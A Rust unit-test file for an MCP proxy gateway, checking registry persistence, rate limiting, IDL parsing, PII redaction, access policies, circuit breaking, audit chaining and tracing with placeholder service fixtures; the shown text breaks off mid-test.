//! Comprehensive Production Test Suite for Omni MCP Platform.
//! Verifies all 13 REA architecture claims + advanced Rust resilience & performance capabilities.

use omni_mcp::config::OmniConfig;
use omni_mcp::control_plane::{
    AutoCrawler, IDLParser, MCPFxHeartbeatMonitor, MCPRegistry, ThirdPartyAuthExchange,
};
use omni_mcp::data_plane::{
    CircuitBreakerRegistry, CircuitState, CodeModeTypeGenerator, FaultInjectionConfig,
    InMemoryConfigCache, MCPProxyGateway, MuttleyMeshClient, PIIRedactor, ProtocolTranslator,
    RateLimiter, ResponseProjectionEngine, SandboxLimits, SecurityCharterEngine,
    SemanticResponseCache,
};
use omni_mcp::extension::{AifxCLI, OmniMCPServer};
use omni_mcp::json;
use omni_mcp::json::JsonValue;
use omni_mcp::models::{
    to_legacy_error_code, validate_mcp_response, ActorType, CharterPolicy, ProtocolType,
    RPCBatchOrSingle, RPCRequest, SchemaSource, ServerRecord, ToolRecord, ToolStatus,
    UpstreamTransportConfig, APPROVAL_INVALID, APPROVAL_REQUIRED, CIRCUIT_OPEN, HEADER_MISMATCH,
    LATEST_SESSION_MCP_PROTOCOL_VERSION, SCHEMA_PREFLIGHT_FAILED, TOOL_DISABLED, UNAUTHORIZED,
    UNSUPPORTED_PROTOCOL_VERSION,
};
use omni_mcp::server::ProductionGatewayContext;
use omni_mcp::storage::{MerkleAuditStore, WalRegistryStore, GENESIS_HASH};
use std::collections::{HashMap, VecDeque};
use std::env;
use std::fs;
use std::path::PathBuf;
use std::sync::{Arc, RwLock};
use std::time::{SystemTime, UNIX_EPOCH};

fn temp_test_path(prefix: &str) -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let mut p = env::temp_dir();
    p.push(format!("{}_{}_{}", prefix, std::process::id(), nanos));
    p.to_string_lossy().into_owned()
}

fn find_omni_binary() -> std::path::PathBuf {
    let current_exe = std::env::current_exe().expect("Must have current exe");
    let mut dir = current_exe.parent().unwrap();
    if dir.file_name().and_then(|n| n.to_str()) == Some("deps") {
        dir = dir.parent().unwrap();
    }
    let omni_name = if cfg!(windows) { "omni.exe" } else { "omni" };
    let candidate = dir.join(omni_name);
    if candidate.exists() {
        return std::fs::canonicalize(&candidate).unwrap_or(candidate);
    }
    let fallback = std::path::PathBuf::from(format!("./target/debug/{}", omni_name));
    if fallback.exists() {
        return std::fs::canonicalize(&fallback).unwrap_or(fallback);
    }
    current_exe
}

#[test]
fn test_wal_persistence_across_restart() {
    let dir = temp_test_path("omni_wal_test");
    let _ = fs::create_dir_all(&dir);
    let db_path = format!("{}/test_omni.db", dir);

    {
        let store = Arc::new(WalRegistryStore::new(&db_path));
        let registry = MCPRegistry::new(Some(store.clone()));

        let mut server = ServerRecord::new(
            "logistics-svc",
            "Logistics",
            "Global fleet routing",
            "fleet-ops",
        );
        server.protocol = ProtocolType::Grpc;
        server.status = ToolStatus::Enabled;

        let mut tool = ToolRecord::new(
            "RouteVehicle",
            "Computes optimal route",
            json!({"type": "object", "properties": {"vehicle_id": {"type": "string"}}}),
        );
        tool.status = ToolStatus::Enabled;
        server.add_tool(tool);
        registry.register_server(server);

        let diff = registry
            .propose_tool_update(
                "logistics-svc",
                "RouteVehicle",
                Some("Production route computer"),
                None,
                "alice",
            )
            .unwrap();
        assert!(registry.approve_diff(&diff.diff_id, "tech_lead").unwrap());
        store.close();
    }

    // Simulate process restart with fresh store & registry
    let new_store = Arc::new(WalRegistryStore::new(&db_path));
    let restarted_registry = MCPRegistry::new(Some(new_store.clone()));

    let recovered = restarted_registry
        .get_server("logistics-svc")
        .expect("Server should persist across restart");
    assert_eq!(recovered.display_name, "Logistics");
    let recovered_tool = recovered
        .get_tool("RouteVehicle")
        .expect("Tool should persist");
    assert_eq!(recovered_tool.version, 2);
    assert_eq!(recovered_tool.description, "Production route computer");

    new_store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_sharded_token_bucket_rate_limit() {
    let limiter = RateLimiter::new(60);
    let key = "test_agent_token:agent";

    let (allowed1, _) = limiter.check_rate_limit(key, 2);
    assert!(allowed1);

    let (allowed2, _) = limiter.check_rate_limit(key, 2);
    assert!(allowed2);

    let (allowed3, _) = limiter.check_rate_limit(key, 2);
    assert!(!allowed3, "Third immediate call should be throttled");
}

#[test]
fn test_disabled_by_default_and_diff_rollback() {
    let registry = MCPRegistry::new(None);
    let mut server = ServerRecord::new(
        "paymentservice",
        "Payment Service",
        "Processes payments for rides and eats",
        "team-payments",
    );
    let tool = ToolRecord::new(
        "ChargeRider",
        "Charges rider card for trip amount",
        json!({"type": "object", "properties": {"amount": {"type": "number"}}}),
    );
    server.add_tool(tool);
    registry.register_server(server);

    // Verify disabled by default
    let fetched = registry.get_server("paymentservice").unwrap();
    assert_eq!(fetched.status, ToolStatus::Disabled);
    assert_eq!(
        fetched.get_tool("ChargeRider").unwrap().status,
        ToolStatus::Disabled
    );

    // Propose diff
    let diff = registry
        .propose_tool_update(
            "paymentservice",
            "ChargeRider",
            Some("Charges rider credit card securely with multi-currency support."),
            None,
            "alice@uber.com",
        )
        .unwrap();
    assert!(!diff.approved);
    assert_eq!(diff.proposed_version, 2);

    // Before approval, version is still 1
    assert_eq!(
        registry
            .get_server("paymentservice")
            .unwrap()
            .get_tool("ChargeRider")
            .unwrap()
            .version,
        1
    );

    // Approve diff
    assert!(registry
        .approve_diff(&diff.diff_id, "bob-lead@uber.com")
        .unwrap());
    let updated = registry.get_server("paymentservice").unwrap();
    let t2 = updated.get_tool("ChargeRider").unwrap();
    assert_eq!(t2.version, 2);
    assert!(t2.description.contains("multi-currency support"));

    // Rollback to v1
    assert!(registry.rollback_tool("paymentservice", "ChargeRider", 1));
    let rolled = registry.get_server("paymentservice").unwrap();
    let t1 = rolled.get_tool("ChargeRider").unwrap();
    assert_eq!(t1.version, 1);
    assert_eq!(t1.description, "Charges rider card for trip amount");
}

#[test]
fn test_protobuf_and_thrift_idl_parsing() {
    let proto = r#"
    syntax = "proto3";
    package uber.fleet;
    message FleetVehicleRequest {
        string vehicle_id = 1; // Unique vehicle identifier
        repeated string sensor_ids = 2; // Specific sensors
        map<string, string> tags = 3; // Vehicle metadata tags
    }
    service FleetManagement {
        // Retrieve vehicle health and diagnostic telemetry
        rpc GetVehicleTelemetry (FleetVehicleRequest) returns (VehicleTelemetryResponse);
    }
    "#;
    let services = IDLParser::parse_protobuf(proto);
    assert_eq!(services.len(), 1);
    let svc = &services[0];
    assert_eq!(svc.service_name, "FleetManagement");
    assert_eq!(svc.methods.len(), 1);
    let m = &svc.methods[0];
    assert_eq!(m.name, "GetVehicleTelemetry");
    assert_eq!(m.protocol, ProtocolType::Grpc);

    let schema = IDLParser::translate_to_json_schema(m);
    let props = schema.get("properties").unwrap();
    assert_eq!(
        props
            .get("vehicle_id")
            .unwrap()
            .get("type")
            .unwrap()
            .as_str(),
        Some("string")
    );
    assert_eq!(
        props
            .get("sensor_ids")
            .unwrap()
            .get("type")
            .unwrap()
            .as_str(),
        Some("array")
    );
    assert_eq!(
        props.get("tags").unwrap().get("type").unwrap().as_str(),
        Some("object")
    );

    let thrift = r#"
    namespace py uber.trip
    service TripPricing {
        // Calculate dynamic surge pricing for trip
        TripQuote calculateSurge(1: string rider_id, 2: double pickup_lat, 3: list<string> promo_codes)
    }
    "#;
    let t_services = IDLParser::parse_thrift(thrift);
    assert_eq!(t_services.len(), 1);
    assert_eq!(t_services[0].service_name, "TripPricing");
    assert_eq!(t_services[0].protocol, ProtocolType::TChannel);
    assert_eq!(t_services[0].methods[0].fields.len(), 3);
    assert!(t_services[0].methods[0].fields[2].is_repeated);
}

#[test]
fn test_native_mcpfx_heartbeat_and_autocrawler() {
    let registry = MCPRegistry::new(None);
    let monitor = MCPFxHeartbeatMonitor::new();
    monitor.emit_heartbeat(
        "geospatial-index",
        "10.0.1.20",
        9090,
        "maps-team",
        "Geospatial Index",
    );

    let crawler = AutoCrawler::new(registry.clone(), Some(monitor), None);
    let res = crawler.run_discovery_workflow();
    assert_eq!(res.get("discovered_servers").unwrap().as_i64(), Some(1));

    let srv = registry.get_server("geospatial-index").unwrap();
    assert!(srv.is_native);
    assert_eq!(srv.status, ToolStatus::Disabled);
    assert!(srv.tools.contains_key("geospatial-index_query"));
}

#[test]
fn test_data_plane_routing_and_protocol_translation() {
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let mesh = MuttleyMeshClient::new();
    let translator = ProtocolTranslator::new(Some(mesh.clone()), None);
    let gateway = MCPProxyGateway::new(cache.clone(), Some(translator));

    let mut server = ServerRecord::new(
        "dispatch-service",
        "Dispatch Service",
        "Real-time ride matching and driver dispatch",
        "core-dispatch",
    );
    server.protocol = ProtocolType::Grpc;
    server.status = ToolStatus::Enabled;

    let mut tool = ToolRecord::new(
        "FindNearbyDrivers",
        "Finds top matching drivers within radius",
        json!({
            "type": "object",
            "properties": {
                "lat": {"type": "number"},
                "lng": {"type": "number"}
            },
            "required": ["lat", "lng"]
        }),
    );
    tool.status = ToolStatus::Enabled;
    tool.protocol = ProtocolType::Grpc;
    tool.downstream_endpoint = "muttley://dispatch/FindNearbyDrivers".to_string();
    tool.downstream_method = "FindNearbyDrivers".to_string();
    server.add_tool(tool);
    registry.register_server(server);
    cache.refresh_now();

    // 1. Initialize
    let init_req = RPCRequest::new(1i64, "initialize", JsonValue::object());
    let init_resp = gateway.handle_request("dispatch-service", &init_req, "agent", None);
    assert!(init_resp.error.is_none());
    assert_eq!(
        init_resp
            .result
            .unwrap()
            .get("serverInfo")
            .unwrap()
            .get("name")
            .unwrap()
            .as_str(),
        Some("omni-mcp/dispatch-service")
    );

    // 2. tools/list
    let list_req = RPCRequest::new(2i64, "tools/list", JsonValue::object());
    let list_resp = gateway.handle_request("dispatch-service", &list_req, "agent", None);
    let tools = list_resp
        .result
        .unwrap()
        .get("tools")
        .unwrap()
        .as_array()
        .unwrap()
        .clone();
    assert_eq!(tools.len(), 1);
    assert_eq!(
        tools[0].get("name").unwrap().as_str(),
        Some("FindNearbyDrivers")
    );

    // 3. tools/call over gRPC -> Muttley
    let call_req = RPCRequest::new(
        3i64,
        "tools/call",
        json!({
            "name": "FindNearbyDrivers",
            "arguments": {"lat": 37.77, "lng": -122.41}
        }),
    );
    let call_resp = gateway.handle_request("dispatch-service", &call_req, "agent", None);
    assert!(call_resp.error.is_none());
    assert_eq!(mesh.get_call_count(Some("dispatch-service")), 1);

    // 4. Disable tool and verify rejection
    registry.toggle_tool_status(
        "dispatch-service",
        "FindNearbyDrivers",
        ToolStatus::Disabled,
    );
    cache.refresh_now();
    let disabled_resp = gateway.handle_request("dispatch-service", &call_req, "agent", None);
    assert_eq!(disabled_resp.error.unwrap().code, TOOL_DISABLED);
}

#[test]
fn test_pii_redactor_and_abac_charter_policy() {
    let raw_text = "Driver: John Doe (john.doe@uber.com), Phone: +1 555-234-5678, SSN: 123-45-6789, Card: 4111 2222 3333 4444, Token: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
    let redacted = PIIRedactor::redact_text(raw_text);
    assert!(!redacted.contains("john.doe@uber.com"));
    assert!(redacted.contains("[REDACTED_EMAIL]"));
    assert!(redacted.contains("[REDACTED_PHONE]"));
    assert!(redacted.contains("[REDACTED_SSN]"));
    assert!(redacted.contains("[REDACTED_CARD]"));
    assert!(redacted.contains("[REDACTED_TOKEN]"));

    let policy = CharterPolicy {
        allowed_actors: vec![ActorType::Human],
        ..Default::default()
    };
    let mut tool = ToolRecord::new("DeleteCustomerData", "GDPR deletion", JsonValue::object());
    tool.charter_policy = Some(policy);
    let server = ServerRecord::new("security-svc", "Security", "", "sec");

    let (allowed_agent, reason) =
        SecurityCharterEngine::evaluate_access(&server, &tool, "agent", None);
    assert!(!allowed_agent);
    assert!(reason.unwrap().contains("not authorized"));

    let (allowed_human, _) = SecurityCharterEngine::evaluate_access(&server, &tool, "human", None);
    assert!(allowed_human);
}

#[test]
fn test_response_projection_and_omni_mcp_discovery() {
    let full_payload = json!({
        "driver": {
            "id": "drv_1",
            "name": "Alex",
            "internal_metrics": {"secret_score": 98.4},
            "vehicle": {"make": "Tesla", "model": "Model 3", "vin": "5YJ3E1EB"}
        },
        "trips": [
            {"id": "t1", "fare": 22.5, "secret": "x"},
            {"id": "t2", "fare": 18.0, "secret": "y"}
        ],
        "unrelated_logs": ["log1", "log2"],
        "status": "AVAILABLE"
    });

    let paths = vec![
        "driver.name".to_string(),
        "driver.vehicle.make".to_string(),
        "trips[].id".to_string(),
        "status".to_string(),
    ];
    let projected = ResponseProjectionEngine::apply_projection(&full_payload, Some(&paths));
    assert_eq!(
        projected
            .get("driver")
            .unwrap()
            .get("name")
            .unwrap()
            .as_str(),
        Some("Alex")
    );
    assert_eq!(
        projected
            .get("driver")
            .unwrap()
            .get("vehicle")
            .unwrap()
            .get("make")
            .unwrap()
            .as_str(),
        Some("Tesla")
    );
    assert!(projected
        .get("driver")
        .unwrap()
        .get("internal_metrics")
        .is_none());
    assert!(projected.get("unrelated_logs").is_none());
    assert_eq!(
        projected.get("trips").unwrap().as_array().unwrap()[0]
            .get("id")
            .unwrap()
            .as_str(),
        Some("t1")
    );
    assert!(projected.get("trips").unwrap().as_array().unwrap()[0]
        .get("secret")
        .is_none());

    // Omni MCP 4-step flow
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let gateway = MCPProxyGateway::new(cache.clone(), None);
    let omni = OmniMCPServer::new(cache.clone(), gateway);

    let mut srv = ServerRecord::new(
        "eats-catalog",
        "Merchant Catalog",
        "Discovers restaurant menus and dishes",
        "eats-eng",
    );
    srv.status = ToolStatus::Enabled;
    let mut tool = ToolRecord::new(
        "GetMenu",
        "Gets menu items for restaurant",
        json!({"type": "object", "properties": {"store_id": {"type": "string"}}}),
    );
    tool.status = ToolStatus::Enabled;
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    // Step 1: discover_server
    let disc_req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({"name": "discover_server", "arguments": {"query": "restaurant menu dishes"}}),
    );
    let disc_resp = omni.handle_request(&disc_req, "agent", None);
    let text = disc_resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let parsed = JsonValue::parse(&text).unwrap();
    assert_eq!(
        parsed["servers"][0]["server_name"].as_str(),
        Some("eats-catalog")
    );

    // Step 2: discover_tools
    let tools_req = RPCRequest::new(
        2i64,
        "tools/call",
        json!({"name": "discover_tools", "arguments": {"server_name": "eats-catalog"}}),
    );
    let tools_resp = omni.handle_request(&tools_req, "agent", None);
    let parsed_tools = JsonValue::parse(
        tools_resp.result.unwrap()["content"][0]["text"]
            .as_str()
            .unwrap(),
    )
    .unwrap();
    assert_eq!(parsed_tools["tools"][0]["name"].as_str(), Some("GetMenu"));

    // Step 3: get_tool_schema
    let schema_req = RPCRequest::new(
        3i64,
        "tools/call",
        json!({"name": "get_tool_schema", "arguments": {"server_name": "eats-catalog", "tool_name": "GetMenu"}}),
    );
    let schema_resp = omni.handle_request(&schema_req, "agent", None);
    let schema_data = JsonValue::parse(
        schema_resp.result.unwrap()["content"][0]["text"]
            .as_str()
            .unwrap(),
    )
    .unwrap();
    assert!(schema_data["inputSchema"]["properties"]
        .get("store_id")
        .is_some());
}

#[test]
fn test_circuit_breaker_and_semantic_cache_and_batch_rpc() {
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let mesh = MuttleyMeshClient::new();
    let translator = ProtocolTranslator::new(Some(mesh.clone()), None);
    let cb = CircuitBreakerRegistry::new(2, 60.0);
    let sem_cache = SemanticResponseCache::new(30.0);
    let gateway =
        MCPProxyGateway::with_resilience(cache.clone(), translator, cb.clone(), sem_cache.clone());

    let mut srv = ServerRecord::new("pricing-svc", "Pricing", "Surge calc", "pricing");
    srv.status = ToolStatus::Enabled;
    let mut tool = ToolRecord::new("GetQuote", "Gets quote", JsonValue::object());
    tool.status = ToolStatus::Enabled;
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    let req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({"name": "GetQuote", "arguments": {"zone": "sfo"}}),
    );

    // First call -> cache miss, hits Muttley
    let resp1 = gateway.handle_request("pricing-svc", &req, "agent", None);
    assert_eq!(
        resp1.result.unwrap()["_metadata"]["cache_hit"].as_bool(),
        Some(false)
    );
    assert_eq!(mesh.get_call_count(Some("pricing-svc")), 1);

    // Second identical call -> served from SemanticResponseCache without hitting Muttley!
    let resp2 = gateway.handle_request("pricing-svc", &req, "agent", None);
    assert_eq!(
        resp2.result.unwrap()["_metadata"]["cache_hit"].as_bool(),
        Some(true)
    );
    assert_eq!(mesh.get_call_count(Some("pricing-svc")), 1);

    // Trip circuit breaker and verify fast fail
    cb.record_failure("pricing-svc");
    cb.record_failure("pricing-svc");
    assert_eq!(cb.get_state("pricing-svc"), CircuitState::Open);

    let blocked_resp = gateway.handle_request("pricing-svc", &req, "agent", None);
    assert_eq!(blocked_resp.error.unwrap().code, CIRCUIT_OPEN);

    // Recover circuit and test Batch JSON-RPC 2.0
    cb.record_success("pricing-svc");
    let batch_json = json!([
        {"jsonrpc": "2.0", "id": 10, "method": "tools/list"},
        {"jsonrpc": "2.0", "id": 11, "method": "tools/call", "params": {"name": "GetQuote", "arguments": {"zone": "nyc"}}}
    ]);
    let batch_req = RPCBatchOrSingle::from_json(&batch_json).unwrap();
    let batch_out = gateway.handle_batch_or_single("pricing-svc", batch_req, "agent", None);
    assert_eq!(batch_out.as_array().unwrap().len(), 2);
}

#[test]
fn test_third_party_oauth_token_exchange_and_unauthorized_rpc() {
    let auth = ThirdPartyAuthExchange::new();
    auth.register_user_token("emp_alice", "jira", "jira_secret_oauth_xyz");
    assert_eq!(
        auth.exchange_token("emp_alice", "jira").as_deref(),
        Some("jira_secret_oauth_xyz")
    );
    // Sandbox fallback for uber_token_*
    assert!(auth
        .exchange_token("uber_token_bob", "jira")
        .unwrap()
        .starts_with("oauth_3p_jira_"));

    // Verify UNAUTHORIZED RPC error when actor is disallowed on gateway
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let gateway = MCPProxyGateway::new(cache.clone(), None);

    let mut srv = auth.create_third_party_server("jira", "eng-prod");
    srv.status = ToolStatus::Enabled;
    srv.charter_policy.allowed_actors = vec![ActorType::Human];
    if let Some(t) = srv.get_tool_mut("search_issues") {
        t.status = ToolStatus::Enabled;
    }
    registry.register_server(srv);
    cache.refresh_now();

    let call_req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({"name": "search_issues", "arguments": {"jql": "project = OMNI"}}),
    );
    let denied = gateway.handle_request("3p_jira", &call_req, "agent", Some("emp_alice"));
    assert_eq!(denied.error.unwrap().code, UNAUTHORIZED);

    let allowed = gateway.handle_request("3p_jira", &call_req, "human", Some("emp_alice"));
    assert!(allowed.error.is_none());
}

#[test]
fn test_omni_mcp_batch_invoke_tools() {
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let gateway = MCPProxyGateway::new(cache.clone(), None);
    let omni = OmniMCPServer::new(cache.clone(), gateway);

    let mut srv = ServerRecord::new("fleet-svc", "Fleet", "Fleet ops", "fleet");
    srv.status = ToolStatus::Enabled;
    let mut tool = ToolRecord::new("PingVehicle", "Pings vehicle", JsonValue::object());
    tool.status = ToolStatus::Enabled;
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    let batch_req = RPCRequest::new(
        99i64,
        "tools/call",
        json!({
            "name": "batch_invoke_tools",
            "arguments": {
                "calls": [
                    {"server_name": "fleet-svc", "tool_name": "PingVehicle", "arguments": {"id": "v1"}},
                    {"server_name": "fleet-svc", "tool_name": "PingVehicle", "arguments": {"id": "v2"}}
                ]
            }
        }),
    );
    let resp = omni.handle_request(&batch_req, "agent", None);
    assert!(resp.error.is_none());
    let text = resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let parsed = JsonValue::parse(&text).unwrap();
    assert_eq!(parsed["batch_results"].as_array().unwrap().len(), 2);
}

#[test]
fn test_aifx_cli_and_http_gateway_endpoints() {
    let dir = temp_test_path("omni_http_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Test CLI list, search, call to file, and benchmark
    let cli = AifxCLI::new(Some(ctx.registry.clone()), None);
    let list_out = cli.list_servers("json");
    let parsed_list = JsonValue::parse(&list_out).unwrap();
    assert!(parsed_list.as_array().unwrap().len() >= 3);

    let search_out = cli.search_tools("driver", "json");
    let parsed_search = JsonValue::parse(&search_out).unwrap();
    assert!(!parsed_search.as_array().unwrap().is_empty());

    let out_file = format!("{}/cli_output.json", dir);
    let call_msg = cli.call_tool(
        "driverdispatchservice",
        "GetDriverLocation",
        r#"{"driver_id": "drv_102"}"#,
        Some("data.driver.name,data.driver.email"),
        Some(&out_file),
        "agent",
        Some("uber_token_test"),
    );
    assert!(call_msg.contains("Written response"));
    let file_content = fs::read_to_string(&out_file).unwrap();
    let saved_json = JsonValue::parse(&file_content).unwrap();
    assert!(saved_json.get("result").is_some());

    // Verify HTTP endpoints (/healthz, /readyz, /metrics, /api/stats, /api/servers)
    let headers = HashMap::new();
    let (status_h, _, _, body_h) = ctx.handle_http("GET", "/healthz", &headers, &[]);
    assert_eq!(status_h, 200);
    let h_json = JsonValue::parse(&String::from_utf8(body_h).unwrap()).unwrap();
    assert_eq!(h_json["status"].as_str(), Some("healthy"));
    assert_eq!(h_json["runtime"].as_str(), Some("rust"));

    let (status_m, _, _, body_m) = ctx.handle_http("GET", "/metrics", &headers, &[]);
    assert_eq!(status_m, 200);
    let m_text = String::from_utf8(body_m).unwrap();
    assert!(m_text.contains("omni_requests_total"));
    assert!(m_text.contains("omni_semantic_cache_hits_total"));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_openapi_and_swagger_idl_discovery() {
    let dir = temp_test_path("omni_openapi_test");
    let store = Arc::new(WalRegistryStore::new(format!("{}/reg.db", dir)));
    let registry = MCPRegistry::new(Some(store.clone()));
    let crawler = AutoCrawler::new(registry.clone(), None, None);

    // OpenAPI 3.1 specification
    let openapi_yaml_or_json = r#"
    {
      "openapi": "3.1.0",
      "info": {"title": "Eats Delivery API", "version": "1.0.0"},
      "paths": {
        "/orders/{order_id}/deliver": {
          "post": {
            "summary": "Dispatch order delivery",
            "tags": ["delivery", "courier", "logistics"],
            "parameters": [
              {"name": "order_id", "in": "path", "required": true, "schema": {"type": "string"}},
              {"name": "courier_id", "in": "query", "required": true, "schema": {"type": "string"}}
            ]
          }
        }
      }
    }
    "#;
    crawler.register_idl_source("eats-delivery", openapi_yaml_or_json);

    // Swagger 2.0 specification
    let swagger_json = r#"
    {
      "swagger": "2.0",
      "info": {"title": "Rider Loyalty API", "version": "2.0.0"},
      "paths": {
        "/loyalty/points": {
          "get": {
            "summary": "Retrieve rider reward points balance",
            "tags": ["loyalty", "rewards"],
            "parameters": [
              {"name": "rider_id", "in": "query", "required": true, "type": "string"}
            ]
          }
        }
      }
    }
    "#;
    crawler.register_idl_source("rider-loyalty", swagger_json);

    crawler.run_discovery_workflow();

    let servers = registry.list_servers(None);
    let s_delivery = servers
        .iter()
        .find(|s| s.name.contains("eatsdelivery"))
        .expect("EatsDelivery should be registered");
    assert_eq!(s_delivery.protocol, ProtocolType::Http);
    let tool_deliver = s_delivery
        .tools
        .values()
        .next()
        .expect("Tool deliver should exist");
    assert!(tool_deliver.name.contains("deliver"));
    assert!(tool_deliver.tags.contains(&"delivery".to_string()));
    assert!(tool_deliver.is_mutation);

    let s_loyalty = servers
        .iter()
        .find(|s| s.name.contains("riderloyalty"))
        .expect("RiderLoyalty should be registered");
    let tool_points = s_loyalty
        .tools
        .values()
        .next()
        .expect("Tool points should exist");
    assert!(tool_points.name.contains("points"));
    assert!(!tool_points.is_mutation);

    store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_merkle_chained_audit_trail() {
    let dir = temp_test_path("omni_merkle_test");
    let audit_file = format!("{}/audit.log", dir);
    let store = MerkleAuditStore::new(Some(audit_file));

    // Record 3 sequential invocations
    let r1 = store.record_invocation(
        "agent",
        "DriverDispatchService",
        "GetDriverLocation",
        &json!({"driver_id": "drv_1"}),
        "OK",
        150,
    );
    assert_eq!(r1.index, 0);
    assert_eq!(r1.prev_hash, GENESIS_HASH);

    let r2 = store.record_invocation(
        "human",
        "TripBillingService",
        "GetTripFare",
        &json!({"trip_id": "trip_99"}),
        "OK",
        220,
    );
    assert_eq!(r2.index, 1);
    assert_eq!(r2.prev_hash, r1.current_hash);

    let r3 = store.record_invocation(
        "agent",
        "PaymentsService",
        "RefundCharge",
        &json!({"charge_id": "ch_7"}),
        "OK:canary",
        310,
    );
    assert_eq!(r3.index, 2);
    assert_eq!(r3.prev_hash, r2.current_hash);

    let (verified, count) = store.verify_chain();
    assert!(verified);
    assert_eq!(count, 3);
    assert_eq!(store.get_head_hash(), r3.current_hash);

    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_opentelemetry_w3c_tracing_and_canary_routing() {
    let dir = temp_test_path("omni_otel_test");
    let store = Arc::new(WalRegistryStore::new(format!("{}/reg.db", dir)));
    let registry = MCPRegistry::new(Some(store.clone()));
    let cache = InMemoryConfigCache::new(registry.clone(), 60.0);

    let mut srv = ServerRecord::new(
        "dispatch-service",
        "Dispatch Service",
        "Fleet telemetry",
        "fleet-team",
    );
    srv.protocol = ProtocolType::Http;
    srv.status = ToolStatus::Enabled;

    let mut tool = ToolRecord::new(
        "GetTelemetry",
        "Returns vehicle telemetry data",
        json!({"type": "object", "properties": {"vehicle_id": {"type": "string"}}}),
    );
    tool.status = ToolStatus::Enabled;
    tool.version = 1;
    tool.canary_version = Some(2);
    tool.canary_weight_pct = 100; // 100% canary for deterministic test verification
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    let audit_store = Arc::new(MerkleAuditStore::new(None));
    let traces = Arc::new(RwLock::new(VecDeque::new()));
    let gateway =
        MCPProxyGateway::new(cache, None).with_observability(audit_store.clone(), traces.clone());

    // Incoming standard W3C traceparent header
    let incoming_traceparent = "00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01";
    let req = RPCRequest::new(
        1001i64,
        "tools/call",
        json!({
            "name": "GetTelemetry",
            "arguments": {"vehicle_id": "veh_42"}
        }),
    );

    let resp = gateway.handle_request_with_trace(
        "dispatch-service",
        &req,
        "agent",
        Some("test_token"),
        Some(incoming_traceparent),
    );

    assert!(resp.error.is_none());
    let meta = &resp.result.unwrap()["_metadata"];
    assert_eq!(
        meta["trace_id"].as_str(),
        Some("4bf92f3577b34da6a3ce929d0e0e4736")
    );
    assert_eq!(meta["canary"].as_bool(), Some(true));
    assert_eq!(meta["version"].as_i64(), Some(2));

    // Verify OpenTelemetry trace span buffer
    let spans_guard = traces.read().unwrap();
    assert_eq!(spans_guard.len(), 1);
    let span = &spans_guard[0];
    assert_eq!(span.trace_id, "4bf92f3577b34da6a3ce929d0e0e4736");
    assert_eq!(span.parent_span_id.as_deref(), Some("00f067aa0ba902b7"));
    assert_eq!(
        span.attributes.get("mcp.canary").unwrap().as_bool(),
        Some(true)
    );

    store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_resilient_fallback_execution() {
    let dir = temp_test_path("omni_fallback_test");
    let store = Arc::new(WalRegistryStore::new(format!("{}/reg.db", dir)));
    let registry = MCPRegistry::new(Some(store.clone()));
    let cache = InMemoryConfigCache::new(registry.clone(), 60.0);

    let mut srv = ServerRecord::new(
        "billing-service",
        "Billing Service",
        "Billing and payments",
        "billing-team",
    );
    srv.protocol = ProtocolType::Http;
    srv.status = ToolStatus::Enabled;

    // Tool 1: Fallback tool (Healthy)
    let mut fb_tool = ToolRecord::new(
        "RefundChargeV1",
        "Legacy synchronous refund fallback",
        json!({"type": "object"}),
    );
    fb_tool.status = ToolStatus::Enabled;
    srv.add_tool(fb_tool);

    // Tool 2: Primary tool with fallback configured
    let mut primary_tool = ToolRecord::new(
        "RefundChargeV2",
        "Modern fast async refund",
        json!({"type": "object"}),
    );
    primary_tool.status = ToolStatus::Enabled;
    primary_tool.fallback_tool = Some("RefundChargeV1".to_string());
    srv.add_tool(primary_tool);

    registry.register_server(srv);
    cache.refresh_now();

    let gateway = MCPProxyGateway::new(cache, None);
    let req = RPCRequest::new(
        2002i64,
        "tools/call",
        json!({
            "name": "RefundChargeV2",
            "arguments": {"charge_id": "ch_999"}
        }),
    );

    let resp = gateway.handle_request("billing-service", &req, "agent", None);
    assert!(resp.error.is_none());
    let meta = &resp.result.unwrap()["_metadata"];
    assert_eq!(meta["server"].as_str(), Some("billing-service"));

    store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_autonomous_planning_diagnostics_and_mcp_resources() {
    let dir = temp_test_path("omni_planning_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));
    let omni = &ctx.omni_mcp;

    // 1. Test recommend_tools (Autonomous planning)
    let plan_req = RPCRequest::new(
        3001i64,
        "tools/call",
        json!({
            "name": "recommend_tools",
            "arguments": {
                "goal": "track driver coordinates and fetch location telemetry",
                "limit": 3
            }
        }),
    );
    let plan_resp = omni.handle_request(&plan_req, "agent", None);
    assert!(plan_resp.error.is_none());
    let plan_text = plan_resp.result.unwrap()["content"][0]["text"]
